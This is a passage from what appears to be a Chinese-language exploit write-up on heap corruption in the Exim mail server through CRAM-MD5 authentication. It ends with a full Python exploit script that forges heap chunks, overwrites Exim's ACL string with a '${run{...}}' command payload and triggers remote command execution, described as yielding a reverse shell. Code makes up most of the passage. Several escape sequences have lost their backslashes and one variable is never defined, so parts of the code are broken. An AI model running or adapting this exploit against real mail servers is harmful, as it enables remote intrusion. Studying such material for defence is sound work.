此时，unsorted
bin中有两个大小为0x2020的chunk（0x5653564e8040、0x5653564ecc70），下一步就是先占用这两个0x2020字节大小的unsorted
bin，然后覆盖0x5653564c76f0这个chunk。
###  5.9 发送auth数据，覆盖acl_check_mail字符串
    payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
    payload4 += 't'*(0x1f80-len(payload4))
    auth(s, b64encode(payload4)+'ee')
占用第一个0x2020字节大小的chunk：0x5653564e8040。解释一下，这里也是用伪造chunk的方法，首先伪造一个0xb0大小的chunk，然后伪造一个0x1f40大小的chunk，这样来达到占用0x2020大小chunk的目的。  
    payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
    payload4 += 't'*(0x1f80-len(payload4))
    auth(s, b64encode(payload4)+'AA')
占用第二个0x2020字节大小的chunk：0x5653564ecc70。  
此时的堆布局就可以开始覆盖地址为0x5653564c76f0的chunk了。
    payload5 = "a"*0x78 + "${run{" + command + "}}x00"
    auth(s, b64encode(payload5)+"AA")
这里需要提一下就是，command命令长度是有限制的，否则会覆盖后面的日志文件路径字符串，导致exim进入其他错误处理流程而不调用execv函数执行command命令。
###  5.10 触发acl检查
    s.sendline("MAIL FROM: ")
触发acl检查，执行/bin/bash命令，反弹shell，效果如下图所示。  
这里需要说明的是反弹的shell不是root权限，而是用户exim权限。
## 6 总结与思考
该漏洞利用条件是比较苛刻的，exim的配置必须开启CRAM-MD5认证，其次exim的启动参数不同会造成堆布局不同，还有必须获取exim运行时堆的地址，才能准确覆盖acl字符串，docker环境中可以选择爆破，但真实环境中在不知道exim程序基地址的情况下采用爆破显然不大可取。如果大家有什么好的思路可以获取exim的堆地址，可以交流一下。
## 7 参考
## 附EXP
    #!/usr/bin/python
    # -*- coding: utf-8 -*-    from pwn import *
    import time
    from base64 import b64encode
    def ehlo(tube, who):
        time.sleep(0.2)
        try:
           tube.sendline("ehlo "+who)
           tube.recvline()
        except:
           print("Error sending ehlo data")
    def docmd(tube, command):
        time.sleep(0.2)
        try:
           tube.sendline(command)
           tube.recvline()
        except:
           print("Error sending docmd data")
    def auth(tube, command):
        time.sleep(0.2)
        try:
           tube.sendline("AUTH CRAM-MD5")
           tube.recvline()
           time.sleep(0.2)
           tube.sendline(command)
           tube.recvline()
        except:
           print("Error sending auth data")
    def execute_command(acl_chunk, command):
        context.log_level='warning'
        s = remote(ip, 25)
        # 1. put a huge chunk into unsorted bin 
        print("[+]1.send ehlo, make unsorted binn")
        ehlo(s, "a"*0x1000) # 0x2020
        ehlo(s, "a"*0x20)
        raw_input("make unsorted bin: 0x7040n")
        # 2. cut the first storeblock by unknown command
        print("[+]2.send unknown commandn")
        docmd(s, "xee"*0x700)
        raw_input("""docmd(s, "xee"*0x700)n""")
        # 3. cut the second storeblock and release the first one
        print("[+]3.send ehlo again to cut storeblockn")
        ehlo(s, "c"*(0x2c00))
        raw_input("""ehlo(s, "c"*(0x2c00))n""")
        # 4. send base64 data and trigger off-by-one
        print("[+]4.overwrite one byte of next chunkn")
        docmd(s, "AUTH CRAM-MD5")
        payload1 = "d"*(0x2020-0x18-1)
        docmd(s, b64encode(payload1)+"EfE")
        raw_input("after payload1n")
        # 5. forge chunk size
        print("[+]5.forge chunk sizen")
        docmd(s, "AUTH CRAM-MD5")
        payload2 = p64(0x1f41)+'m'*0x70 # modify fake size
        docmd(s, b64encode(payload2))
        raw_input("modified fake sizen")
        # 6. relase extended chunk
        print("[+]6.resend ehlo, elase extended chunkn")
        ehlo(s, "a+")
        raw_input("ehlo(s, 'a+')")
        # 7. overwrite next pointer of overlapped storeblock
        print("[+]7.overwrite next pointer of overlapped storeblockn")
        docmd(s, "AUTH CRAM-MD5")
        raw_input("docmd(s, 'AUTH CRAM-MD5')n")
        acl_chunk = p64(0x5653564c1000+0x66f0)  #acl_chunk = &heap_base + 0x66f0
        payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + acl_chunk
        try:
            docmd(s, b64encode(payload3)) # fake chunk header and storeblock next
            raw_input("after payload3")
            # 8. reset storeblocks and retrive the ACL storeblock
            print("[+]8.reset storeblockn")
            #ehlo(s, 'crashed') released
            ehlo(s, 'crashed')
            raw_input("ehlo(s, 'crashed')")
            # 9. overwrite acl strings
            print("[+]9.overwrite acl stringsn")
            #Occupy the first 0x2020 chunk
            payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
            payload4 += 't'*(0x1f80-len(payload4))
            auth(s, b64encode(payload4)+'ee')
            #Occupy the second 0x2020 chunk
            payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
            payload4 += 't'*(0x1f80-len(payload4))
            auth(s, b64encode(payload4)+'AA')
            raw_input("after payload4")
            #overwrite acl strings with shell payload
            payload5 = "a"*0x78 + "${run{" + command + "}}x00"
            auth(s, b64encode(payload5)+"AA")
            raw_input("after payload5")
            # 10. trigger acl check
            print("[+]10.trigger acl check and execute commandn")
            time.sleep(0.2)
            s.sendline("MAIL FROM: ")
            s.close()
            return 1
        except Exception, e:
            print('Error:%s'%e)
            s.close()
            return 0
    if __name__ == "__main__":
       if len(sys.argv) > 0:
          ip = '127.0.0.1'
          acl_chunk = 0x0
          execute_command(acl_chunk, command)